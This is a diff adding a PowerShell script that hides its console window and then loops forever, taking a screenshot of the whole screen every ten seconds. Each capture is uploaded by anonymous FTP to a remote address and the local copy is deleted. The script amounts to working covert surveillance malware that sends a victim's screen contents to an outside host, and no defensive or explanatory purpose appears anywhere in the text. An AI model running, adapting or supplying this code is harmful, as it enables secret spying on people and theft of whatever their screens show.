@@ -1,0 +1,101 @@
+# .Net methods for hiding/showing the console in the background
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("Kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+'
+
+function Hide-Console
+{
+    $consolePtr = [Console.Window]::GetConsoleWindow()
+    #0 hide
+    [Console.Window]::ShowWindow($consolePtr, 0)
+}
+
+ Hide-Console
+
+
+function FTP-send
+{
+
+
+# create the FtpWebRequest and configure it
+$ftp = [System.Net.FtpWebRequest]::Create("ftp://[ADDRESS]/" + $timestamp +".png")
+$ftp = [System.Net.FtpWebRequest]$ftp
+$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
+$ftp.Credentials = new-object System.Net.NetworkCredential("anonymous","anonymous@localhost")
+$ftp.UseBinary = $true
+$ftp.UsePassive = $false # before was true
+# read in the file to upload as a byte array
+$content = [System.IO.File]::ReadAllBytes($File)
+$ftp.ContentLength = $content.Length
+# get the request stream, and write the bytes into it
+$rs = $ftp.GetRequestStream()
+$rs.Write($content, 0, $content.Length)
+# be sure to clean up after ourselves
+echo "Sent"
+$rs.Close()
+$rs.Dispose()
+
+
+
+}
+
+
+$count = 0
+while($true){
+
+try {
+# seconds to pass before the next iteration occours
+ 
+
+# file path
+$File = 'C:\temp\1.bmp'
+
+# check if dir exists or create it
+$path = "C:\temp\" 
+If(!(test-path $path)) 
+{ 
+New-Item -ItemType Directory -Force -Path $path 
+}
+Add-Type -AssemblyName System.Windows.Forms
+Add-type -AssemblyName System.Drawing
+# Gather Screen resolution information
+$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+# Create bitmap using the top-left and bottom-right bounds
+$bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
+
+# Create Graphics object
+$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+
+# Capture screen
+$graphic.CopyFromScreen($Screen.Left, $Screen.Top, 0, 0, $bitmap.Size)
+$timestamp = Get-Date -Format o | ForEach-Object { $_ -replace ":", "." }
+
+
+# Save to file
+$bitmap.Save($File)
+Write-Output "Screenshot saved to:"
+Write-Output $File
+
+FTP-send
+
+Remove-Item $File
+Start-Sleep -seconds 10;
+
+} catch {
+echo "something wrong"
+Start-Sleep -seconds 60; 
+
+}
+
+}
+
+
+
+
+
+
+
